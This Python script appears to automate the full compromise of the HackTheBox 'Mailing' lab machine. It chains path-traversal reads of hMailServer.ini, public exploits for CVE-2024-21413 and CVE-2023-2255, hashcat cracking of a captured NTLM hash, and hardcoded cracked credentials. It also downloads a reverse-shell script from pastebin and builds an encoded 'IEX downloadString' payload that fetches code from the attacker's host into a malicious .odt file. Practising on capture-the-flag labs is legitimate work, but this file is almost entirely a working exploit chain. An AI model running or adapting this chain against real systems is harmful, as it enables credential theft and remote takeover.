import sys, os, requests, re, subprocess, paramiko,threading
import time as cm
from colorama import Fore, init
from datetime import datetime
from questionary import Style, select
from consolemenu import SelectionMenu
from sshtunnel import SSHTunnelForwarder

class Tmsg:
    def __str__(self):
        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)

init(autoreset=True)
custom_style = Style([
    ('qmark', 'fg:#FF5F87 bold'),
    ('question', 'fg:#017cff bold'),             
    ('answer', 'fg:#01ff4e bold'),     
    ('pointer', 'fg:#fbff00 bold'),    
    ('highlighted', 'fg:#00FFFF bold'),
    ('selected', 'fg:#22b9c5 bold'),        
    ('separator', 'fg:#6C6C6C bold'),
])

global machine_ip
global target_machine
global ln

def banner():
    os.system("clear")
    bnn = """
    
    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
           ░                                                             
    __________________________________________________________________________
    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Mailing
    __________________________________________________________________________\n"""
    print(Fore.LIGHTBLUE_EX + f"{bnn}")

tmsg = Tmsg()
ln = Fore.GREEN+"========================================="+Fore.RESET

def menu_panel():
    options=["[+] maya","[+] localadmin", "[-] exit"]
    opcion = select(
        "Selecciona una opción:",
        choices=options,
        style=custom_style
    ).ask()
        
    return [opcion,options]

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

def hmsg(user,msg):
    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"

#------------------------------------------------------------------------

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.11.14" # change this if change ip on htb.

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(ln)
            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
        else:
            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")

def default_cred_user():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
        print(tmsg,hmsg("user","Default User connection"))
        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(tmsg,Fore.RED + f"[Target Path Exploit ] > " + Fore.YELLOW + f"{target_machine}");print(ln)
        else:
            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Mailing Network");print(ln)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")

#------------------------------------------------------------------------

def maya_connection_user():
    commands_send('curl -s -X GET "http://mailing.htb/download.php?file=..\..\..\..\Windows\System32\drivers\etc\hosts"')
    commands_send('curl -s -X GET "http://mailing.htb/download.php?file=..\..\..\..\..\program+files+(x86)\hMailServer\Bin\hMailServer.ini"')
    print(Fore.YELLOW+f"=========================================")
    commands_send('curl -s -X GET "http://mailing.htb/download.php?file=..\..\..\..\..\program+files+(x86)\hMailServer\Bin\hMailServer.ini" > pass')
    cred_encrypted_pass = commands_send("cat pass | grep 'Administrator' | tr '=' ' ' | awk '{print $NF}'")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[maya-user (Password-encrypted)] > " + Fore.GREEN + f"Pass {cred_encrypted_pass}")
    commands_send("git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.git")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[maya-user Command (Listen-Port-Files)] > " + Fore.LIGHTMAGENTA_EX + f"sudo impacket-smbserver smbFolder $(pwd) -smb2support")
    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [maya_user] > " + Fore.WHITE + f"Press ENTER to continue...")
    run_script_get_hash=f"cd CVE-2024-21413* && python3 CVE-2024-21413.py --server {target_machine} --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url \"\\{machine_ip}\smbFolder\\test\" --subject \"Look at this ASAP\""
    print(tmsg,Fore.LIGHTBLUE_EX +f"[maya-user (Run-Command)] > " + Fore.GREEN + f"{run_script_get_hash}")
    hash_file=input(str(tmsg)+Fore.LIGHTRED_EX + f" [maya_user] Enter hash (maya:MAILING:aaaaaaa .....) > " + Fore.WHITE + f"Paste > ")
    # print(hash_file)
    commands_send(f'echo "{hash_file}" > hashes')
    print(commands_send("hashcat -a 0 -m 5600 hashes /usr/share/wordlists/rockyou.txt -O"))
    # commands_send(f"evil-winrm -i {target_machine} -u 'maya' -p 'm4y4ngs4ri'") ## change password if not valid.
    print(tmsg,Fore.RED + f"[Exploit - maya-user] > " + Fore.YELLOW + f"Run command > " + Fore.LIGHTCYAN_EX + f"evil-winrm -i {target_machine} -u 'maya' -p 'm4y4ngs4ri'");cm.sleep(.5) ## change password if not valid.

def localadmin_connection_user():
    commands_send("git clone https://github.com/elweth-sec/CVE-2023-2255.git")
    commands_send("cd CVE-2023* && cd samples && 7z x test.odt")
    commands_send("wget https://pastebin.com/raw/g0PvkSbe")
    commands_send("mv g0PvkSbe reverse.ps1")
    commands_send(f"sed -i \"s/'your_ip'/'{machine_ip}'/\" reverse.ps1")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[localadmin-user Command (Listen-Port-Files)] > " + Fore.LIGHTMAGENTA_EX + f"sudo impacket-smbserver smbFolder $(pwd) -smb2support")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[localadmin-user Command (Listen-Port-443)] > " + Fore.LIGHTMAGENTA_EX + f"sudo rlwrap nc -nlvp 443")
    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [localadmin_user] > " + Fore.WHITE + f"Press ENTER to continue...")
    commands_send(f"echo 'IEX(New-Object Net.WebClient).downloadString('http://{machine_ip}:8000/reverse.ps1')' > payload")
    send_rs1_command=commands_send("cat payload | iconv -t utf-16le | base64 -w 0")
    commands_send(f'cd CVE-2023* && python3 CVE-2023-2255.py --cmd "cmd /c powershell -enc {send_rs1_command}" --output exploit.odt')
    path_file=commands_send("pwd")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[localadmin-user Command (Windows)] > " + Fore.LIGHTMAGENTA_EX + f"cd C:\Important*")
    print(tmsg,Fore.LIGHTBLUE_EX +f"[localadmin-user Command (Windows)] > " + Fore.LIGHTMAGENTA_EX + f"upload {path_file}/exploit.odt")

    
#------------------------------------------------------------------------
def undected():
    try:
        checker_status();cm.sleep(.8)
        default_cred_user();cm.sleep(.8)
        print(Fore.YELLOW+f"=========================================")
        while True:
            opcion = menu_panel()
            print(Fore.YELLOW+f"=========================================")
            if opcion[0] == opcion[1][0]:
                print(tmsg,hmsg("user","maya-user connection"))
                print(tmsg,Fore.RED + f"[Exploit - Chase-user] > " + Fore.YELLOW + f"Path Exploit" + Fore.LIGHTCYAN_EX + f"http://mailing.htb/download.php?file=..\..\..\..\..\program+files+(x86)\hMailServer\Bin\hMailServer.ini");cm.sleep(.5)
                print(tmsg,Fore.RED + f"[Exploit - Chase-user] > " + Fore.YELLOW + f"Cracked Password" + Fore.LIGHTCYAN_EX + f"");cm.sleep(.5)                
                maya_connection_user()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[maya-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
            elif opcion[0] == opcion[1][1]:
                print(tmsg,hmsg("user","localadmin user connection"))
                localadmin_connection_user()
                print(tmsg,Fore.LIGHTBLUE_EX +f"[localadmin-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
                break
            elif opcion[0] == opcion[1][-1]:
                break
            else:
                break
    except:
        pass
    
if __name__ == '__main__':
    banner()
    undected()
